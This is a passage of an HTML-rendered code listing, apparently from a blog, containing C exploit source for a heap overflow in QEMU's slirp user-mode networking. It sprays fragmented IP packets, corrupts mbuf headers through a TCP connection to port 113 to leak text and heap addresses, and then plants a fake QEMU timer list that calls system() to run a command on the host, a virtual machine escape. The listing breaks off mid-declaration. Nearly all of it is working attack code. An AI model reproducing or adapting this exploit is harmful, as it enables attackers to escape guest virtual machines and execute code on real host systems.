class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">// close()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// strcpy, memset(), and memcpy()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span>      <span class="comment">// struct addrinfo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  <span class="comment">// needed for socket(), uint8_t, uint16_t, uint32_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span> <span class="comment">// needed for socket()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span> <span class="comment">// IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span> <span class="comment">// struct ip and IP_MAXPACKET (which is 65535)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip_icmp.h&gt;</span> <span class="comment">// struct icmp, ICMP_ECHO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __FAVOR_BSD          <span class="comment">// Use BSD format of tcp header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span>     <span class="comment">// struct tcphdr</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>       <span class="comment">// inet_pton() and inet_ntop()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>       <span class="comment">// macro ioctl is defined</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/ioctls.h&gt;</span>     <span class="comment">// defines values for argument &quot;request&quot; of ioctl.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span>          <span class="comment">// struct ifreq</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span>  <span class="comment">// ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span> <span class="comment">// struct sockaddr_ll (see man 7 packet)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span> <span class="comment">// gettimeofday()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span> <span class="comment">// errno, perror()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some constants.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDRLEN 14 <span class="comment">// Ethernet header length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP4_HDRLEN 20 <span class="comment">// IPv4 header length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCP_HDRLEN 20 <span class="comment">// TCP header length, excludes options data</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ICMP_HDRLEN 8 <span class="comment">// ICMP header length for echo request, excludes data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line"><span class="meta">    do &#123;                                                                       \</span></span><br><span class="line"><span class="meta">        fprintf(stderr, <span class="string">&quot;%s:%d(): &quot;</span> fmt, __func__, __LINE__, ##__VA_ARGS__);   \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line"><span class="meta">    do &#123;                                                                       \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char  g_interface[] = &quot;ens2&quot;;</span></span><br><span class="line"><span class="type">char</span>  g_interface[] = <span class="string">&quot;enp0s3&quot;</span>;</span><br><span class="line"><span class="type">char</span> host[] = <span class="string">&quot;10.0.2.2&quot;</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *Slirp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_next</span>;</span> <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span> <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span> <span class="comment">/* Flags aren&#x27;t used in the output queue */</span></span><br><span class="line">    <span class="type">int</span> m_flags;            <span class="comment">/* Misc flags */</span></span><br><span class="line">    <span class="type">int</span> m_size;             <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line">    <span class="type">caddr_t</span> m_data; <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="type">int</span> m_len;      <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="type">bool</span> resolution_requested;</span><br><span class="line">    <span class="type">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="type">char</span> *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="type">char</span> m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some header info to pass to the send_ip_pkt</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> ip_id;</span><br><span class="line">    <span class="type">uint16_t</span> ip_off;</span><br><span class="line">    <span class="type">bool</span> MF;</span><br><span class="line">    <span class="type">uint8_t</span> ip_p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function prototypes</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">checksum</span><span class="params">(<span class="type">uint16_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">icmp4_checksum</span><span class="params">(<span class="keyword">struct</span> icmp, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">tcp4_checksum</span><span class="params">(<span class="keyword">struct</span> ip, <span class="keyword">struct</span> tcphdr, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">allocate_strmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">allocate_ustrmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> *<span class="title function_">allocate_intmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">(<span class="type">int</span>, <span class="type">uint16_t</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_ip_pkt</span><span class="params">(<span class="keyword">struct</span> ip_pkt_info *, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">uint64_t</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">send_raw_pkt</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">uint64_t</span>, <span class="type">int</span>, <span class="type">uint8_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> text_base, heap_base;</span><br><span class="line"><span class="type">uint16_t</span> g_spray_ip_id;</span><br><span class="line"><span class="type">int</span> stop_flag;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> eth_frame[] =</span><br><span class="line">            <span class="string">&quot;\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="type">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;game start&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);</span><br><span class="line">    iphdr = (<span class="keyword">struct</span> ip *)(buf + ETH_HDRLEN);</span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;10.0.2.15&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;10.0.2.2&quot;</span>);</span><br><span class="line">    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    iphdr-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line">    iphdr-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这不需要htons，因为在ip_input里会转换一遍</span></span><br><span class="line">    iphdr-&gt;ip_len = (ICMP_HDRLEN);</span><br><span class="line">    iphdr-&gt;ip_id = (<span class="number">0xcdcd</span>);</span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    iphdr-&gt;ip_off = ((<span class="number">0</span> &lt;&lt; <span class="number">15</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">14</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">13</span>) + (<span class="number">0</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    iphdr-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line">    iphdr-&gt;ip_p = IPPROTO_ICMP;</span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != <span class="number">1</span> ||</span><br><span class="line">        (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    iphdr-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr-&gt;ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    icmphdr = (<span class="keyword">struct</span> icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    icmphdr-&gt;icmp_type = ICMP_ECHO;</span><br><span class="line">    <span class="comment">// Message Code (8 bits): echo request</span></span><br><span class="line">    icmphdr-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Identifier (16 bits): usually pid of sending process - pick a number</span></span><br><span class="line">    icmphdr-&gt;icmp_id = htons(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// Sequence Number (16 bits): starts at 0</span></span><br><span class="line">    icmphdr-&gt;icmp_seq = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ICMP header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    <span class="comment">// TBD</span></span><br><span class="line">    <span class="comment">// icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen);</span></span><br><span class="line">    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//const char exec_cmd[] =</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//const char exec_cmd[] = &quot;/snap/bin/gnome-calculator&quot;;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> exec_cmd[] = <span class="string">&quot;/usr/bin/xcalc&quot;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd,<span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xaabb</span>;</span><br><span class="line">    arbitrary_write(</span><br><span class="line">            <span class="number">0x0b00</span>, <span class="number">3</span>, buf,</span><br><span class="line">            ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + <span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>, <span class="number">0x250</span>+<span class="number">0x50</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xbbaa</span>;</span><br><span class="line">    leak(<span class="number">0x0b00</span> + <span class="number">0x318</span> + <span class="number">0x14</span> + ETH_HDRLEN,</span><br><span class="line">         <span class="number">3</span>); <span class="comment">// reass处理完后会把m_data减掉ip头的长度</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;after leak&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer_list</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)buf = text_base +  0x11e9040; // qemu_clocks</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)buf = text_base +  <span class="number">0x12C3920</span>; <span class="comment">// qemu_clocks</span></span><br><span class="line">    <span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x30eeda</span>; <span class="comment">// qemu_timer_notify_cb</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">// end of timer_list</span></span><br><span class="line">    <span class="comment">// start of active_timers</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">    $49 = &#123;</span></span><br><span class="line"><span class="comment">        expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">        timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">        cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">        opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">        next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">        attributes = 0x0,</span></span><br><span class="line"><span class="comment">        scale = 0xf4240</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2be010</span>;    <span class="comment">// system plt</span></span><br><span class="line">    <span class="comment">//to verify</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe38</span> + <span class="number">0xa</span>; <span class="comment">// parameter address</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">    g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">    arbitrary_write(fake_timer_list - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">0xa0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have finished writing fake timer list.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    stop_flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// dbg_printf(&quot;check heap here&quot;);</span></span><br><span class="line">    <span class="comment">// qemu timer</span></span><br><span class="line">    <span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">    g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">    arbitrary_write(text_base + <span class="number">0x12C3900</span> - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">8</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have finished writing main_loop_tlg.\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> addr_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *payload = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="type">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="type">uint32_t</span> *payload32 = (<span class="type">uint32_t</span> *)payload;</span><br><span class="line">    <span class="type">uint64_t</span> *payload64 = (<span class="type">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;ama2in9&quot;</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">&quot;in leak_text...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;spraying size 0x2000, id: %d\n&quot;</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">&quot;spray finished.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;0ops: client&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let&#x27;s overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">        <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">60000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">        <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">        <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;send %d complete\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="type">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="type">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="type">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="type">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]leaking: Now we have finished faking m_data.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;trigger reass!&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;ama2in9&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]leaking: Now we have finished writting to target.\nAlso, this means we will get the response packet we want.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="type">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span 